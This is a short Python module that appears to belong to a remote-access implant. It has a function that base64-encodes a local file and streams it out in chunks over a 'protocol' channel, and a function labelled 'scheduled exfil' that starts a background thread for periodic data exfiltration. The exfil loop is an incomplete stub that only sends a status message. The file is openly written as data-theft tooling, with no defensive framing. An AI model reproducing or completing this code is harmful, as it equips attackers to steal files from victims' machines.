import base64
import json


def chunked_upload(protocol, file_path, chunk_size=1024 * 512):
    """Upload a file in chunks to avoid memory issues with large files."""
    import os
    if not os.path.exists(file_path):
        protocol.send(f'[-] File not found: {file_path}')
        return

    file_size = os.path.getsize(file_path)
    total_chunks = (file_size + chunk_size - 1) // chunk_size

    protocol.send(json.dumps({
        'type': 'file_start',
        'name': os.path.basename(file_path),
        'size': file_size,
        'chunks': total_chunks,
    }))

    with open(file_path, 'rb') as f:
        for i in range(total_chunks):
            chunk = f.read(chunk_size)
            protocol.send(json.dumps({
                'type': 'file_chunk',
                'index': i,
                'data': base64.b64encode(chunk).decode(),
            }))
            response = protocol.recv()
            if isinstance(response, str) and response.startswith('[-]'):
                return

    protocol.send('file_complete')


def scheduled_exfil(protocol, pattern, interval=3600):
    """Schedule periodic data exfiltration."""
    import threading
    import time

    def _exfil_loop():
        while True:
            try:
                protocol.send(f'[*] Scheduled exfil running: {pattern}')
                time.sleep(interval)
            except Exception:
                break

    t = threading.Thread(target=_exfil_loop, daemon=True)
    t.start()
    return f'[+] Scheduled exfil started (pattern: {pattern}, interval: {interval}s)'
